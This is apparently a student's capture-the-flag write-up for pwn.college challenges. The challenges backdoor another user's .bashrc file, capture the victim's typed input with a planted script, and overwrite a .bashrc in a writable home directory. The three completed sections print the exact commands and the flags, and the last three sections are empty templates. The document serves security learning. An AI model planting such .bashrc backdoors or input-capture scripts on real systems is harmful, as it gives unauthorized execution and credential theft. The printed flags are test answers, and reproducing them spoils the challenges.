# Bashrc Backdoor

### Edit .bashrc


**Flag:** `pwn.college{cv8W_UYxYaPgaeK7AQx8kfMvlPn.0VMzEzNxwSN2EzNzEzW}`

## Process
Ran `nano /home/zardus/.bashrc` and added `cat /flag` to it. Then, `/challenge/victim` gave me the flag.

## What I learnt
`.bashrc` is the file run on the startup of the shell/terminal.

## References
No references used.



<br><br><br><br><br>



# Sniffing Input

### Make a bash script to get input


**Flag:** `pwn.college{s7pxa6UX26yxmgYRrzPaHKP8uI_.0VNzEzNxwSN2EzNzEzW}`

## Process
Ran `nano /home/zardus/.bashrc` and wrote
```
read input

if [ $input == "flag_checker" ]
then
        echo "Type the flag"
        read flag
        cat $flag
fi
```
Then I ran `/challenge/victim` to get the flag.

## What I learnt
Input into the terminal can be read by any program with the correct permissions.

## References
No references used.



<br><br><br><br<br>




# Overshared Directories

### Rewrite a file in an opened up directory


**Flag:** `pwn.college{gK-rwkpnIfR2Hxd2J_wvqRMDtOi.0FM0EzNxwSN2EzNzEzW}`

## Process
Ran `rm /home/zardus/.bashrc` and then `nano /home/zardus/.bashrc` and wrote the previous code into the file. Then, on running `/challenge/victim` I got the flag

## What I learnt
Files can be accessed if in an opened up directory.

## References
No references used.



<br><br><br><br<br>



# Tricky Linking

### Desc


**Flag:** ``

## Process


## What I learnt


## References
No references used.



<br><br><br><br<br>




# Sniffing Process Arguments

### Desc


**Flag:** ``

## Process


## What I learnt


## References
No references used.



<br><br><br><br<br>




# Snooping on Configuratiins

### Desc


**Flag:** ``

## Process


## What I learnt


## References
No references used.
